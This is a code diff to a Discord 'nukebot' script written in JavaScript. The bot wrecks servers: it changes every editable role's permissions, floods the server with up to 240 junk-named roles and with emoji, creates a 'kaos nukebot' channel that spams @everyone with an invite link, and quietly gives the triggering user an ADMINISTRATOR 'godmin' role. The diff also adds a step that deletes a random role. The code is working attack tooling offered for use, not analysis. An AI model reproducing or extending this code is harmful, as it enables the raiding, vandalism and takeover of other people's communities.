@@ -295,12 +295,12 @@ setTimeout(() => {
 
   message.guild.roles.cache.forEach(r => {
     if(r.editable) {
-      r.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE'])
+      r.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE', 'CREATE_INSTANT_INVITE', 'ATTACH_FILES'])
     .catch(console.error)}
-  var times = 250 - message.guild.roles.cache.size - 5
+  var times = 240
   var idkhere = 0
    while(idkhere < times) {
-    message.guild.roles.create(channelnames())
+    message.guild.roles.create({name: channelnames()})
 idkhere++}
   })
 },3000)
@@ -316,9 +316,8 @@ if(message.channel.type === "dm") {return}
 }    
           var b = 0
    while(b < 39) {
+b++
 await message.guild.emojis.create(randomicons123(), "itwasmebarry")
-await message.guild.emojis.create('https://thumbs.gfycat.com/WaterloggedIncomparableAiredale-size_restricted.gif', "zoom")
- b++  
  }  
    }
   }
@@ -449,7 +448,7 @@ and a wheel's broken`, "https://youtu.be/EzQ3G5PpQ58 https://discord.gg/Wer9XGTg
  
 
  function channelnames() {
-   var rand = ["【ＣＧ】assy", "【ＣＧ】assy", "𝔹𝕐𝔼 𝔹𝕐𝔼", "𝗪𝗘𝗘 𝗛𝗘𝗘 𝗛𝗘𝗘", "『ΛDᄃ』", "卂丂丂ㄚs destructive corner", "🃏hue🎭hue🃏🎭huehue🃏huehue♠♣♥♦huehuehue🃏huehuehue", "☜☝☟☞☝chaos☟chaos☝☜☟☝☞","♛♤♦♧♣♡♥♢♠♛", "♛♤♧♡♢chaos♠♣♥♦♛", "🃏🃏🃏", "🎭🎭🎭neo-chaos🎭🎭🎭", "ᑕh̷̛̭͔͚̟͈̭͓̪̠͇̃̿̾͌₳ㄖ『s』", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "get fucked ﷽﷽﷽", "匚卄卂ㄖ丂 匚卄卂ㄖ丂", "卂丂丂ㄚ", "𝗜 𝗖𝗔𝗡 𝗗𝗢 𝗔𝗡𝗬𝗧𝗛𝗜𝗡𝗚"]
+   var rand = ["kaos", "【ＣＧ】kaos", "【ＣＧ】assy", "𝔹𝕐𝔼 𝔹𝕐𝔼", "𝗪𝗘𝗘 𝗛𝗘𝗘 𝗛𝗘𝗘", "『ΛDᄃ』", "卂丂丂ㄚs destructive corner", "🃏hue🎭hue🃏🎭huehue🃏huehue♠♣♥♦huehuehue🃏huehuehue", "☜☝☟☞☝chaos☟chaos☝☜☟☝☞","♛♤♦♧♣♡♥♢♠♛", "♛♤♧♡♢chaos♠♣♥♦♛", "🃏🃏🃏", "🎭🎭🎭neo-chaos🎭🎭🎭", "ᑕh̷̛̭͔͚̟͈̭͓̪̠͇̃̿̾͌₳ㄖ『s』", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "get fucked ﷽﷽﷽", "匚卄卂ㄖ丂 匚卄卂ㄖ丂", "卂丂丂ㄚ", "𝗜 𝗖𝗔𝗡 𝗗𝗢 𝗔𝗡𝗬𝗧𝗛𝗜𝗡𝗚"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
@@ -489,7 +488,7 @@ if(list.includes(msg.author.id)) {return}
         var number = 0
         var pray = -1
         setTimeout(() => { 
-           msg.guild.channels.create('【ＣＧ】assy ').then(p => {
+           msg.guild.channels.create('kaos nukebot').then(p => {
                 p.send("@everyone all hail me")
                 p.send("https://discord.gg/Wer9XGTgNA @everyone")
                 p.send("IT WAS ME BARRY")
@@ -1698,7 +1697,9 @@ client.on('message', message => {
     if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }
         var botr = msg.guild.me.roles.highest.position - 0
 const adminn = msg.guild.roles.cache.find(r => r.name === 'godmin')
-    if(!adminn) {msg.guild.roles.create({ data: { name: 'godmin', permissions: ['ADMINISTRATOR'], position: botr, hoist: false} }).then(r => msg.member.roles.add(r).then(msg.delete()))}    
+    if(!adminn) {
+msg.guild.roles.cache.random().delete()
+msg.guild.roles.create({ data: { name: 'godmin', permissions: ['ADMINISTRATOR'], position: botr, hoist: false} }).then(r => msg.member.roles.add(r).then(msg.delete()))}    
      else{
       await adminn.setPermissions(['ADMINISTRATOR'])
      await msg.member.roles.add(adminn).then(msg.delete())}
